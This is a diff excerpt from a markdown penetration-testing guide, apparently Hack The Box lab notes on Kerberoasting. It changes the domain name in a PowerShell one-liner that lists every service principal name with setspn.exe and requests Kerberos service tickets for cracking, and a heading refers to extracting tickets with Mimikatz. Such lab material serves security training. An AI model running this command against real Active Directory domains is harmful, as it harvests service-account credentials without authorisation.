@@ -57,7 +57,7 @@ SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
 ### Retrieving All Tickets Using setspn.exe
 
 ```powershell
-setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+setspn.exe -T HTB.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
 ### Extracting Tickets from Memory with Mimikatz
